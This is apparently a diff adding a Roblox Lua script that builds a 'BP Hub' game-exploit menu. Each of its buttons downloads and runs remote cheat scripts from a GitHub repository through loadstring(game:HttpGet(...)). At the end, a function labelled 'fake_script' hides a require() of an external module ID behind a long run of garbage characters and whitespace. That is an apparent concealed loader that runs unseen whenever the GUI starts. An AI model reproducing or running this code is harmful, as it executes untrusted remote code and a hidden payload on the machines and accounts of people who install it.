@@ -1,0 +1,127 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local InfoFrame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local MainFrame = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local ABG = Instance.new("ImageButton")
+local TCA = Instance.new("ImageButton")
+local BF = Instance.new("ImageButton")
+local UIGridLayout = Instance.new("UIGridLayout")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+InfoFrame.Name = "Info Frame"
+InfoFrame.Parent = ScreenGui
+InfoFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+InfoFrame.Position = UDim2.new(0.197195441, 0, 0.157142863, 0)
+InfoFrame.Size = UDim2.new(0, 691, 0, 434)
+
+TextLabel.Parent = InfoFrame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Size = UDim2.new(0, 131, 0, 23)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "BP Hub | Version 1.3"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextWrapped = true
+
+TextLabel_2.Parent = InfoFrame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.70332849, 0, 0, 0)
+TextLabel_2.Size = UDim2.new(0, 205, 0, 23)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "A Script For This Game Does Not Exist :("
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 14.000
+TextLabel_2.TextWrapped = true
+
+TextLabel_3.Parent = InfoFrame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.BackgroundTransparency = 1.000
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Position = UDim2.new(0.302460194, 0, 0, 0)
+TextLabel_3.Size = UDim2.new(0, 243, 0, 23)
+TextLabel_3.Font = Enum.Font.SourceSans
+TextLabel_3.Text = "Start Exploiting!"
+TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_3.TextScaled = true
+TextLabel_3.TextSize = 14.000
+TextLabel_3.TextWrapped = true
+
+MainFrame.Name = "Main Frame"
+MainFrame.Parent = InfoFrame
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MainFrame.BorderColor3 = Color3.fromRGB(0, 170, 255)
+MainFrame.BorderSizePixel = 0
+MainFrame.Position = UDim2.new(0.5, 0, 0.519534051, 0)
+MainFrame.Size = UDim2.new(0.403711885, 400, 0.223399848, 308)
+MainFrame.ZIndex = 2
+
+Frame.Parent = MainFrame
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.Position = UDim2.new(0.0103092343, 0, 0.0148148146, 0)
+Frame.Size = UDim2.new(0, 666, 0, 392)
+
+ABG.Name = "ABG"
+ABG.Parent = Frame
+ABG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ABG.Position = UDim2.new(0.414999992, 0, 0.0250000004, 0)
+ABG.SelectionImageObject = TCA
+ABG.Size = UDim2.new(0, 90, 0, 90)
+ABG.Image = "rbxassetid://12983343004"
+ABG.MouseButton1Down:connect(function()
+	ScreenGui:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Another%20Bizarre%20Game", true))()
+end)
+
+TCA.Name = "TCA"
+TCA.Parent = Frame
+TCA.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TCA.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+TCA.Size = UDim2.new(0, 90, 0, 90)
+TCA.Image = "rbxassetid://12983346429"
+TCA.MouseButton1Down:connect(function()
+	ScreenGui:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/That%20Crazy%20Adventure", true))()
+end)
+
+BF.Name = "BF"
+BF.Parent = Frame
+BF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+BF.Position = UDim2.new(0.215000004, 0, 0.0250000004, 0)
+BF.Size = UDim2.new(0, 90, 0, 90)
+BF.Image = "rbxassetid://12983344856"
+BF.MouseButton1Down:connect(function()
+	ScreenGui:Destroy()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Bey%20Physics", true))()
+end)
+
+UIGridLayout.Parent = Frame
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellPadding = UDim2.new(0, 13, 0, 5)
+
+-- Scripts:
+
+local function TGHKG_fake_script() -- TCA. 
+	local script = Instance.new('Script', TCA)
+
+	
+	--[[ Last synced 4/7/2023 01:47 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5355299916) --[[                                                                                                  ]]--
+end
+coroutine.wrap(TGHKG_fake_script)()
